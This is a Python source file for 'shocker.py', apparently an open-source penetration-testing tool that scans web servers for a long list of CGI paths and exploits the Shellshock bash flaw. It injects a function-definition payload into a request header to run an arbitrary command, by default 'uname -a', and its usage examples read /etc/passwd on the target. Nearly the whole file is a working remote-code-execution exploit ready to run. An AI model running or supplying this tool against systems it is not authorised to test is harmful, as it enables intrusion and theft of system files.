#!/usr/bin/python

"""
shocker.py v0.5
A tool to find and exploit webservers vulnerable to Shellshock

##############################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
#                                                                            #
# Developed by Tom Watson, tom.watson@nccgroup.com                           #
#                                                                            #
# http://www.github.com/nccgroup/??????????????                              #
#                                                                            #
# Released under the GNU Affero General Public License                       #
# (http://www.gnu.org/licenses/agpl-3.0.html)                                #
##############################################################################

Usage examples:
./shocker.py 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
/etc/passwd

./shocker.py www.example.com -p 8001 -s
Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
attempts the default exploit for any found

Changes in version 0.5
* Added ability to specify a single script to target rather than using cgi_list
* Introduced a timeout on socket operations for host_check
* Added some usage examples in the script header
* Added an epilogue to the help text indicating presence of examples

Changes in version 0.4
* Introduced a thread count limit defaulting to 10
* Removed colour support until I can figure out how to make it work in\
    Windows and *nix equally well
* Spelling corrections
* More comprehensive cgi_list
* Removes success_flag from output

TODO

Add some slightly more useful exploitation options. (Shells?)
Support for multiple hosts via a file switch on the command line?
Add a summary of results before exiting
Save results to a file? Format?
* Eventually the idea is to include multiple possible vectors but currently\
    only one is checked.
Implement some form of progress indicator for slow tasks
Fix problem with proxy returning 200 for unavailable URLs/false positives
Add Windows and *nix colour support
Prettify
Other stuff. Probably.

Thanks to...
Anthony Caulfield @ NCC for time and effort reviewing early versions
"""

import urllib2
import argparse
import string
import StringIO
import random
import signal
import sys
import socket
import Queue
import threading


# A list of potential CGI scripts to look for on the target host
# Credits to the following from whence many were borrowed:
# https://github.com/mubix/shellshocker-pocs/blob/master/shell_sprayer.py
# http://patrickpierson.us/wp-content/uploads/2014/09/shellshock.txt
#  http://khalil-shreateh.com/khalil.shtml/index.php/websites/websites-security/201-ais-shellshock-scanning-tool-that-leverages-the-user-agent-header-against-a-large-list-of-possible-targets-written-in-c.html?showall=1
# http://www.linuxfeed.org/2014/10/advanced-information-security-shellshock-scanner/
# https://github.com/francisck/shellshock-cgi/blob/master/shellshock_cgi.py
# http://shellshock.detectify.com

cgi_list = [
'/',
'/admin.cgi',
'/administrator.cgi',
'/agora.cgi',
'/aktivate/cgi-bin/catgy.cgi',
'/analyse.cgi',
'/apps/web/vs_diag.cgi',
'/axis-cgi/buffer/command.cgi',
'/b2-include/b2edit.showposts.php',
'/bandwidth/index.cgi',
'/bigconf.cgi',
'/cartcart.cgi',
'/cart.cgi',
'/ccbill/whereami.cgi',
'/cgi-bin/14all-1.1.cgi',
'/cgi-bin/14all.cgi',
'/cgi-bin/a1disp3.cgi',
'/cgi-bin/a1stats/a1disp3.cgi',
'/cgi-bin/a1stats/a1disp4.cgi',
'/cgi-bin/addbanner.cgi',
'/cgi-bin/add_ftp.cgi',
'/cgi-bin/adduser.cgi',
'/cgi-bin/admin/admin.cgi',
'/cgi-bin/admin.cgi',
'/cgi-bin/admin/getparam.cgi',
'/cgi-bin/adminhot.cgi',
'/cgi-bin/admin.pl',
'/cgi-bin/admin/setup.cgi',
'/cgi-bin/adminwww.cgi',
'/cgi-bin/af.cgi',
'/cgi-bin/aglimpse.cgi',
'/cgi-bin/alienform.cgi',
'/cgi-bin/AnyBoard.cgi',
'/cgi-bin/architext_query.cgi',
'/cgi-bin/astrocam.cgi',
'/cgi-bin/AT-admin.cgi',
'/cgi-bin/AT-generate.cgi',
'/cgi-bin/auction/auction.cgi',
'/cgi-bin/auktion.cgi',
'/cgi-bin/ax-admin.cgi',
'/cgi-bin/ax.cgi',
'/cgi-bin/axs.cgi',
'/cgi-bin/badmin.cgi',
'/cgi-bin/banner.cgi',
'/cgi-bin/bannereditor.cgi',
'/cgi-bin/bb-ack.sh',
'/cgi-bin/bb-histlog.sh',
'/cgi-bin/bb-hist.sh',
'/cgi-bin/bb-hostsvc.sh',
'/cgi-bin/bb-replog.sh',
'/cgi-bin/bb-rep.sh',
'/cgi-bin/bbs_forum.cgi',
'/cgi-bin/bigconf.cgi',
'/cgi-bin/bizdb1-search.cgi',
'/cgi-bin/blog/mt-check.cgi',
'/cgi-bin/blog/mt-load.cgi',
'/cgi-bin/bnbform.cgi',
'/cgi-bin/book.cgi',
'/cgi-bin/boozt/admin/index.cgi',
'/cgi-bin/bsguest.cgi',
'/cgi-bin/bslist.cgi',
'/cgi-bin/build.cgi',
'/cgi-bin/bulk/bulk.cgi',
'/cgi-bin/cached_feed.cgi',
'/cgi-bin/cachemgr.cgi',
'/cgi-bin/calendar/index.cgi',
'/cgi-bin/cartmanager.cgi',
'/cgi-bin/cbmc/forums.cgi',
'/cgi-bin/ccvsblame.cgi',
'/cgi-bin/c_download.cgi',
'/cgi-bin/cgforum.cgi',
'/cgi-bin/.cgi',
'/cgi-bin/cgi_process',
'/cgi-bin/classified.cgi',
'/cgi-bin/classifieds.cgi',
'/cgi-bin/classifieds/classifieds.cgi',
'/cgi-bin/classifieds/index.cgi',
'/cgi-bin/.cobalt/alert/service.cgi',
'/cgi-bin/.cobalt/message/message.cgi',
'/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi',
'/cgi-bin/commandit.cgi',
'/cgi-bin/commerce.cgi',
'/cgi-bin/common/listrec.pl',
'/cgi-bin/compatible.cgi',
'/cgi-bin/Count.cgi',
'/cgi-bin/csChatRBox.cgi',
'/cgi-bin/csGuestBook.cgi',
'/cgi-bin/csLiveSupport.cgi',
'/cgi-bin/CSMailto.cgi',
'/cgi-bin/CSMailto/CSMailto.cgi',
'/cgi-bin/csNews.cgi',
'/cgi-bin/csNewsPro.cgi',
'/cgi-bin/csPassword.cgi',
'/cgi-bin/csPassword/csPassword.cgi',
'/cgi-bin/csSearch.cgi',
'/cgi-bin/csv_db.cgi',
'/cgi-bin/cvsblame.cgi',
'/cgi-bin/cvslog.cgi',
'/cgi-bin/cvsquery.cgi',
'/cgi-bin/cvsqueryform.cgi',
'/cgi-bin/day5datacopier.cgi',
'/cgi-bin/day5datanotifier.cgi',
'/cgi-bin/db_manager.cgi',
'/cgi-bin/dbman/db.cgi',
'/cgi-bin/dcforum.cgi',
'/cgi-bin/dcshop.cgi',
'/cgi-bin/dfire.cgi',
'/cgi-bin/diagnose.cgi',
'/cgi-bin/dig.cgi',
'/cgi-bin/directorypro.cgi',
'/cgi-bin/download.cgi',
'/cgi-bin/e87_Ba79yo87.cgi',
'/cgi-bin/emu/html/emumail.cgi',
'/cgi-bin/emumail.cgi',
'/cgi-bin/emumail/emumail.cgi',
'/cgi-bin/enter.cgi',
'/cgi-bin/environ.cgi',
'/cgi-bin/ezadmin.cgi',
'/cgi-bin/ezboard.cgi',
'/cgi-bin/ezman.cgi',
'/cgi-bin/ezshopper2/loadpage.cgi',
'/cgi-bin/ezshopper3/loadpage.cgi',
'/cgi-bin/ezshopper/loadpage.cgi',
'/cgi-bin/ezshopper/search.cgi',
'/cgi-bin/faqmanager.cgi',
'/cgi-bin/FileSeek2.cgi',
'/cgi-bin/FileSeek.cgi',
'/cgi-bin/finger.cgi',
'/cgi-bin/flexform.cgi',
'/cgi-bin/fom.cgi',
'/cgi-bin/fom/fom.cgi',
'/cgi-bin/FormHandler.cgi',
'/cgi-bin/FormMail.cgi',
'/cgi-bin/gbadmin.cgi',
'/cgi-bin/gbook/gbook.cgi',
'/cgi-bin/generate.cgi',
'/cgi-bin/getdoc.cgi',
'/cgi-bin/gH.cgi',
'/cgi-bin/gm-authors.cgi',
'/cgi-bin/gm.cgi',
'/cgi-bin/gm-cplog.cgi',
'/cgi-bin/guestbook.cgi',
'/cgi-bin/handler',
'/cgi-bin/handler.cgi',
'/cgi-bin/handler/netsonar',
'/cgi-bin/hitview.cgi',
'/cgi-bin/hsx.cgi',
'/cgi-bin/html2chtml.cgi',
'/cgi-bin/html2wml.cgi',
'/cgi-bin/htsearch.cgi',
'/cgi-bin/icat',
'/cgi-bin/if/admin/nph-build.cgi',
'/cgi-bin/ikonboard/help.cgi',
'/cgi-bin/ImageFolio/admin/admin.cgi',
'/cgi-bin/imageFolio.cgi',
'/cgi-bin/index.cgi',
'/cgi-bin/infosrch.cgi',
'/cgi-bin/jammail.pl',
'/cgi-bin/journal.cgi',
'/cgi-bin/lastlines.cgi',
'/cgi-bin/loadpage.cgi',
'/cgi-bin/login.cgi',
'/cgi-bin/logit.cgi',
'/cgi-bin/log-reader.cgi',
'/cgi-bin/lookwho.cgi',
'/cgi-bin/lwgate.cgi',
'/cgi-bin/MachineInfo',
'/cgi-bin/MachineInfo',
'/cgi-bin/magiccard.cgi',
'/cgi-bin/mail/emumail.cgi',
'/cgi-bin/maillist.cgi',
'/cgi-bin/mailnews.cgi',
'/cgi-bin/mail/nph-mr.cgi',
'/cgi-bin/main.cgi',
'/cgi-bin/main_menu.pl',
'/cgi-bin/man.sh',
'/cgi-bin/mini_logger.cgi',
'/cgi-bin/mmstdod.cgi',
'/cgi-bin/moin.cgi',
'/cgi-bin/mojo/mojo.cgi',
'/cgi-bin/mrtg.cgi',
'/cgi-bin/mt.cgi',
'/cgi-bin/mt/mt.cgi',
'/cgi-bin/mt/mt-check.cgi',
'/cgi-bin/mt/mt-load.cgi',
'/cgi-bin/mt-static/mt-check.cgi',
'/cgi-bin/mt-static/mt-load.cgi',
'/cgi-bin/musicqueue.cgi',
'/cgi-bin/myguestbook.cgi',
'/cgi-bin/.namazu.cgi',
'/cgi-bin/nbmember.cgi',
'/cgi-bin/netauth.cgi',
'/cgi-bin/netpad.cgi',
'/cgi-bin/newsdesk.cgi',
'/cgi-bin/nlog-smb.cgi',
'/cgi-bin/nph-emumail.cgi',
'/cgi-bin/nph-exploitscanget.cgi',
'/cgi-bin/nph-publish.cgi',
'/cgi-bin/nph-test.cgi',
'/cgi-bin/pagelog.cgi',
'/cgi-bin/pbcgi.cgi',
'/cgi-bin/perlshop.cgi',
'/cgi-bin/pfdispaly.cgi',
'/cgi-bin/pfdisplay.cgi',
'/cgi-bin/phf.cgi',
'/cgi-bin/photo/manage.cgi',
'/cgi-bin/photo/protected/manage.cgi',
'/cgi-bin/php-cgi',
'/cgi-bin/php.cgi',
'/cgi-bin/php.fcgi',
'/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi',
'/cgi-bin/pollssi.cgi',
'/cgi-bin/postcards.cgi',
'/cgi-bin/powerup/r.cgi',
'/cgi-bin/printenv',
'/cgi-bin/probecontrol.cgi',
'/cgi-bin/profile.cgi',
'/cgi-bin/publisher/search.cgi',
'/cgi-bin/quickstore.cgi',
'/cgi-bin/quizme.cgi',
'/cgi-bin/ratlog.cgi',
'/cgi-bin/r.cgi',
'/cgi-bin/register.cgi',
'/cgi-bin/replicator/webpage.cgi/',
'/cgi-bin/responder.cgi',
'/cgi-bin/robadmin.cgi',
'/cgi-bin/robpoll.cgi',
'/cgi-bin/rtpd.cgi',
'/cgi-bin/sbcgi/sitebuilder.cgi',
'/cgi-bin/scoadminreg.cgi',
'/cgi-bin-sdb/printenv',
'/cgi-bin/sdbsearch.cgi',
'/cgi-bin/search',
'/cgi-bin/search.cgi',
'/cgi-bin/search/search.cgi',
'/cgi-bin/sendform.cgi',
'/cgi-bin/shop.cgi',
'/cgi-bin/shopper.cgi',
'/cgi-bin/shopplus.cgi',
'/cgi-bin/showcheckins.cgi',
'/cgi-bin/simplestguest.cgi',
'/cgi-bin/simplestmail.cgi',
'/cgi-bin/smartsearch.cgi',
'/cgi-bin/smartsearch/smartsearch.cgi',
'/cgi-bin/snorkerz.bat',
'/cgi-bin/snorkerz.bat',
'/cgi-bin/snorkerz.cmd',
'/cgi-bin/snorkerz.cmd',
'/cgi-bin/sojourn.cgi',
'/cgi-bin/spin_client.cgi',
'/cgi-bin/start.cgi',
'/cgi-bin/status',
'/cgi-bin/status_cgi',
'/cgi-bin/store/agora.cgi',
'/cgi-bin/store.cgi',
'/cgi-bin/store/index.cgi',
'/cgi-bin/survey.cgi',
'/cgi-bin/sync.cgi',
'/cgi-bin/talkback.cgi',
'/cgi-bin/technote/main.cgi',
'/cgi-bin/test2.pl',
'/cgi-bin/test-cgi',
'/cgi-bin/test.cgi',
'/cgi-bin/testing_whatever',
'/cgi-bin/test/test.cgi',
'/cgi-bin/tidfinder.cgi',
'/cgi-bin/tigvote.cgi',
'/cgi-bin/title.cgi',
'/cgi-bin/top.cgi',
'/cgi-bin/traffic.cgi',
'/cgi-bin/troops.cgi',
'/cgi-bin/ttawebtop.cgi/',
'/cgi-bin/ultraboard.cgi',
'/cgi-bin/upload.cgi',
'/cgi-bin/urlcount.cgi',
'/cgi-bin/viewcvs.cgi',
'/cgi-bin/view_help.cgi',
'/cgi-bin/viralator.cgi',
'/cgi-bin/virgil.cgi',
'/cgi-bin/vote.cgi',
'/cgi-bin/vpasswd.cgi',
'/cgi-bin/way-board.cgi',
'/cgi-bin/way-board/way-board.cgi',
'/cgi-bin/webbbs.cgi',
'/cgi-bin/webcart/webcart.cgi',
'/cgi-bin/webdist.cgi',
'/cgi-bin/webif.cgi',
'/cgi-bin/webmail/html/emumail.cgi',
'/cgi-bin/webmap.cgi',
'/cgi-bin/webspirs.cgi',
'/cgi-bin/Web_Store/web_store.cgi',
'/cgi-bin/whois.cgi',
'/cgi-bin/whois_raw.cgi',
'/cgi-bin/whois/whois.cgi',
'/cgi-bin/wrap',
'/cgi-bin/wrap.cgi',
'/cgi-bin/wwwboard.cgi.cgi',
'/cgi-bin/YaBB/YaBB.cgi',
'/cgi-bin/zml.cgi',
'/cgi-mod/index.cgi',
'/cgis/wwwboard/wwwboard.cgi',
'/cgi-sys/addalink.cgi',
'/cgi-sys/defaultwebpage.cgi',
'/cgi-sys/domainredirect.cgi',
'/cgi-sys/entropybanner.cgi',
'/cgi-sys/entropysearch.cgi',
'/cgi-sys/FormMail-clone.cgi',
'/cgi-sys/helpdesk.cgi',
'/cgi-sys/mchat.cgi',
'/cgi-sys/randhtml.cgi',
'/cgi-sys/realhelpdesk.cgi',
'/cgi-sys/realsignup.cgi',
'/cgi-sys/signup.cgi',
'/connector.cgi',
'/cp/rac/nsManager.cgi',
'/create_release.sh',
'/CSNews.cgi',
'/csPassword.cgi',
'/dcadmin.cgi',
'/dcboard.cgi',
'/dcforum.cgi',
'/dcforum/dcforum.cgi',
'/debuff.cgi',
'/debug.cgi',
'/details.cgi',
'/edittag/edittag.cgi',
'/emumail.cgi',
'/enter_buff.cgi',
'/enter_bug.cgi',
'/ez2000/ezadmin.cgi',
'/ez2000/ezboard.cgi',
'/ez2000/ezman.cgi',
'/fcgi-bin/echo',
'/fcgi-bin/echo',
'/fcgi-bin/echo2',
'/fcgi-bin/echo2',
'/Gozila.cgi',
'/hitmatic/analyse.cgi',
'/hp_docs/cgi-bin/index.cgi',
'/html/cgi-bin/cgicso',
'/html/cgi-bin/cgicso',
'/index.cgi',
'/info.cgi',
'/infosrch.cgi',
'/login.cgi',
'/mailview.cgi',
'/main.cgi',
'/megabook/admin.cgi',
'/ministats/admin.cgi',
'/mods/apage/apage.cgi',
'/_mt/mt.cgi',
'/musicqueue.cgi',
'/ncbook.cgi',
'/newpro.cgi',
'/newsletter.sh',
'/oem_webstage/cgi-bin/oemapp_cgi',
'/page.cgi',
'/parse_xml.cgi',
'/photodata/manage.cgi',
'/photo/manage.cgi',
'/print.cgi',
'/process_buff.cgi',
'/process_bug.cgi',
'/pub/english.cgi',
'/quikmail/nph-emumail.cgi',
'/quikstore.cgi',
'/reviews/newpro.cgi',
'/ROADS/cgi-bin/search.pl',
'/sample01.cgi',
'/sample02.cgi',
'/sample03.cgi',
'/sample04.cgi',
'/sampleposteddata.cgi',
'/scancfg.cgi',
'/scancfg.cgi',
'/servers/link.cgi',
'/setpasswd.cgi',
'/SetSecurity.shm',
'/shop/member_html.cgi',
'/shop/normal_html.cgi',
'/site_searcher.cgi',
'/siteUserMod.cgi',
'/submit.cgi',
'/technote/print.cgi',
'/template.cgi',
'/test.cgi',
'/upload.cgi',
'/userreg.cgi',
'/users/scripts/submit.cgi',
'/vood/cgi-bin/vood_view.cgi',
'/Web_Store/web_store.cgi',
'/webtools/bonsai/ccvsblame.cgi',
'/webtools/bonsai/cvsblame.cgi',
'/webtools/bonsai/cvslog.cgi',
'/webtools/bonsai/cvsquery.cgi',
'/webtools/bonsai/cvsqueryform.cgi',
'/webtools/bonsai/showcheckins.cgi',
'/wwwadmin.cgi',
'/wwwboard.cgi',
'/wwwboard/wwwboard.cgi'
]

# User-agent to use instead of 'Python-urllib/2.6' or similar
user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    sys.exit(0)


def check_host(host, port, verbose):
    try:
        print "[+] Checking setup..."
        if verbose: print "[I] Checking to see if %s resolves..." % host
        ipaddr = socket.gethostbyname(host)
        if verbose: print "[I] Resolved ok"
        if verbose: print "[I] Checking to see if %s is reachable..." % host
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((ipaddr, int(port)))
        s.close()
        if verbose: print "[I] %s seems reachable..." % host
        print "[+] Good to go!"
    except Exception as e:
        print "[-] Exception: %s" % e
        print "[-] Exiting..."
        exit(1)


def scan_host(protocol, host, port, proxy, verbose):
    # List of potentially epxloitable URLs 
    exploit_targets = []
    cgi_index = 0
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []

    # Go through each potential cgi in cgi_list spinning up a thread for each
    # check. Create Request objects for each check. 
    print "[+] Starting host scan for %s on port %s" % (host, port) 
    print "[+] Looking for CGIs..."
    for cgi in cgi_list:
        cgi_index += 1
        try:
            req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
            url = req.get_full_url()
            if proxy:
                req.set_proxy(proxy, "http")    
            
            # Pretend not to be Python for no particular reason
            req.add_header("User-Agent", user_agent)

            # Set the host header correctly (Python includes :port)
            req.add_header("Host", host)
            
            thread_pool.acquire()
            
            # Start a thread for each CGI in cgi_list
            if verbose: print "[I] Starting thread %i" % cgi_index
            t = threading.Thread(target = check_cgi, args = (req, q))
            t.start()
            threads.append(t)
        except Exception as e: 
            if verbose: print "[+] %s - %s" % (url, e) 
        finally:
            pass

    # Wait for all the threads to finish before moving on    
    for thread in threads:
        thread.join()

    print "[+] Finished host scan"
    
    # Pop any results from the Queue and add them to the list of potentially 
    # exploitable urls (exploit_targets) before returning that list
    while not q.empty():
        exploit_targets.append(q.get())
    return exploit_targets

def check_cgi(req, q):
    try:
        if urllib2.urlopen(req, None, 5):
            q.put(req.get_full_url())
    except Exception as e:
        pass
    finally:
        thread_pool.release()

def exploit_cgi(host, proxy, target_list, exploit, verbose):
    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))
    
    # Dictionary of header:attack string to try against discovered CGI scripts
    attack_strings = {
       "Content-typo": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
       }

    print "[+] %i potential targets found" % len(target_list)
    print "[+] Attempting exploits..."
    for target in target_list:
        print "\n[+] Trying exploit for %s" % target 
        for header, attack in attack_strings.iteritems():
            try:
                if verbose:
                    print "  [+] Header is: %s" % header
                    print "  [+] Attack string is: %s" % attack
                    print "  [+] Flag set to: %s" % success_flag
                req = urllib2.Request(target)
                req.add_header(header, attack)
                if proxy:
                    req.set_proxy(proxy, "http")    
                    if verbose: print "  [+] Proxy set to: %s" % str(proxy)
                req.add_header("User-Agent", user_agent)
                req.add_header("Host", host)
                resp = urllib2.urlopen(req)
                result =  resp.read()
                if success_flag in result:
                    print "[!] %s looks vulnerable" % target 
                    print "[!] Response returned was:" 
                    # print "\n\033[92m" + result + "\033[0m"
                    # print "\n%s" % result
                    buf = StringIO.StringIO(result)
                    for line in buf:
                        if line.strip() != success_flag: 
                            print "%s" % line.strip()
                    print "\n"
                    buf.close()
                else:
                    print "[-] Not vulnerable" 
            except Exception as e:
                if verbose: print "[-] Exception - %s - %s" % (target, e) 
            finally:
                pass


def main():
    print """
   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v0.5 
   
 Tom Watson, tom.watson@nccgroup.com
 http://www.github.com/nccgroup/??????????????
     
 Released under the GNU Affero General Public License
 (http://www.gnu.org/licenses/agpl-3.0.html)
    """ 
    # Handle CTRL-c elegently
    signal.signal(signal.SIGINT, signal_handler)

    # Handle command line argumemts
    parser = argparse.ArgumentParser(
        description='A Shellshock scanner and exploitation tool',
        epilog='Examples of use can be found in the source code' 
        './shocker.py 127.0.0.1 -e "cat /etc/passwd" -c "/cgi-bin/test.cgi"\n' +
        'Scan /cgi-bin/test.cgi on localhost and attempt to car /etc/passwd' +
        'if it is present'
        )
    parser.add_argument(
        'host', 
        help='The target host'
        )
    parser.add_argument(
        '--port',
        '-p',
        default=80,
        type=int, 
        help='The target port number (default=80)'
        )
    parser.add_argument(
        '--exploit',
        '-e',
        default="/bin/uname -a",
        help="Command to execute (default=/bin/uname -a)"
        )
    parser.add_argument(
        '--cgi',
        '-c',
        type=str,
        help="Single CGI to check (e.g. /cgi-bin/test.cgi)"
        )
    parser.add_argument(
        '--proxy', 
        help="*A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
        )
    parser.add_argument(
        '--ssl',
        '-s',
        action="store_true", 
        default=False,
        help="Use SSL (default=False)"
        )
    parser.add_argument(
        '--threads',
        '-t',
        type=int,
        default=10,
        help="Maximum number of threads (default=10, max=100)"
        )
    parser.add_argument(
        '--verbose',
        '-v',
        action="store_true", 
        default=False,
        help="Be verbose in output"
        )
    args = parser.parse_args()

    # Assign options to variables
    host = args.host
    port = str(args.port)
    if args.proxy is not None:
        proxy = args.proxy
    else:
        proxy = ""
    verbose = args.verbose
    exploit = args.exploit
    if args.ssl == True or port == "443":
        protocol = "https"
    else:
        protocol = "http"
    global thread_pool
    if args.threads > 100:
        print "Maximum number of threads is 100"
        exit(0) 
    else:
        thread_pool = threading.BoundedSemaphore(args.threads)
    if args.cgi is not None:
        global cgi_list
        cgi_list = [args.cgi]

    # Check to see host resolves and is reachable on the chosen port
    check_host(host, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    target_list = scan_host(protocol, host, port, proxy, verbose)

    # If any cgi scripts were found on the target host try to exploit them
    if len(target_list) > 0:
        exploit_cgi(host, proxy, target_list, exploit, verbose)
    else:
        print "[+] No potential targets found - Exiting..."
        exit(0)
    print "[+] The end"

if __name__ == '__main__':
    main()
